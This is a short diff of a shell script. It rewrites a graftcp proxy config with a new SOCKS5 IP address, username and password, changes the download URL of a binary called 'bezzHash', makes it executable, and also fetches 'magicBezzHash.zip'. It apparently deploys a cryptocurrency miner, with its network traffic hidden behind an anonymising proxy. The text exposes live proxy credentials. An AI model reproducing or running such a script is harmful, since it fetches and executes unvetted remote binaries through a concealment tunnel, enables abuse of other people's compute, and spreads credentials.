@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 147.182.230.110:1080
-socks5_username = sikilnjaran
-socks5_password = Njejekatos
+socks5 = 18.223.155.101:1080
+socks5_username = Guaelbow
+socks5_password = Absentos
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -35,7 +35,7 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+./graftcp/graftcp wget https://raw.githubusercontent.com/githuboneheart/-/main/views/bezzHash
 chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
